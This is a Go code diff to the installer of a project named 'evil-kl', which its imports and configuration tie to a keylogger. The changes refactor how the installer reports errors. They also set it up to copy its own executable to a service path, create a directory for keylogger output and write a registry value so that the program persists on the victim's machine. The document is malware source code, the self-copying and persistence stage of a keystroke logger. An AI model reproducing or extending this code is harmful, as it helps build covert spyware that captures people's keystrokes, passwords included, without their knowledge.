@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"path/filepath"
 
 	logger "github.com/dm1trypon/easy-logger"
 	"github.com/dm1trypon/evil-kl/internal/app/config"
@@ -23,53 +24,49 @@ func (i *Installer) Create(cfg config.Cfg) *Installer {
 		lc:           "INSTALLER",
 		registryInst: new(registry.Registry).Create(),
 		cfg:          cfg,
-		chCritError:  make(chan bool, 1),
 	}
 
 	return i
 }
 
-// Run <Installer> - starts the installation process
-func (i *Installer) Run() {
+/*
+Run <Installer> - starts the installation process
+	Returns <bool>:
+		1. installation status
+*/
+func (i *Installer) Run() bool {
 	if i.isInstalled() {
 		logger.InfoJ(i.lc, "Service already installed")
-		return
+		return false
 	}
 
 	if !i.isRoot() {
 		logger.InfoJ(i.lc, "User is not root")
-		i.chCritError <- true
-		return
+		return false
 	}
 
-	if err := os.MkdirAll(i.cfg.Installer.ServicePath, os.ModePerm); err != nil {
+	if err := os.MkdirAll(filepath.Dir(i.cfg.Installer.ServicePath), os.ModePerm); err != nil {
 		logger.ErrorJ(i.lc, fmt.Sprint("Error make service's temp's directory: ", err.Error()))
-		i.chCritError <- true
-		return
+		return false
 	}
 
-	path := fmt.Sprint(i.cfg.Installer.ServicePath, i.cfg.Installer.ServiceName)
-
-	if err := i.copyFiles(os.Args[0], path); err != nil {
-		i.chCritError <- true
-		return
+	if err := os.MkdirAll(filepath.Dir(i.cfg.Keylogger.Path), os.ModePerm); err != nil {
+		logger.ErrorJ(i.lc, fmt.Sprint("Error make keylogger's temp's directory: ", err.Error()))
+		return false
 	}
 
-	if err := i.registryInst.SetStringValue(i.cfg.Installer.RegPath, i.cfg.Installer.RegName, path); err != nil {
-		i.chCritError <- true
-		return
+	if err := i.copyFiles(os.Args[0], i.cfg.Installer.ServicePath); err != nil {
+		return false
 	}
 
-	i.chCritError <- false
-}
+	if err := i.registryInst.SetStringValue(i.cfg.Installer.RegPath,
+		i.cfg.Installer.RegName, i.cfg.Installer.ServicePath); err != nil {
+		return false
+	}
 
-/*
-GetChCritError <Installer> - getting error channel
-	Returns <<-chan bool>:
-		1. Channel error
-*/
-func (i *Installer) GetChCritError() <-chan bool {
-	return i.chCritError
+	logger.InfoJ(i.lc, fmt.Sprint("Service has been installed to ", i.cfg.Installer.ServicePath))
+
+	return true
 }
 
 // CopyFiles method clone the file
@@ -111,12 +108,12 @@ isInstalled <Installer> - service installation check
 		1. Is installed
 */
 func (i *Installer) isInstalled() bool {
-	value, err := i.registryInst.GetStringValue(i.cfg.Installer.RegPath, i.cfg.Service.Name)
+	value, err := i.registryInst.GetStringValue(i.cfg.Installer.RegPath, i.cfg.Installer.RegName)
 	if err != nil {
 		return false
 	}
 
-	if value != fmt.Sprint(i.cfg.Installer.ServicePath, i.cfg.Installer.ServiceName) {
+	if value != i.cfg.Installer.ServicePath {
 		return false
 	}
 
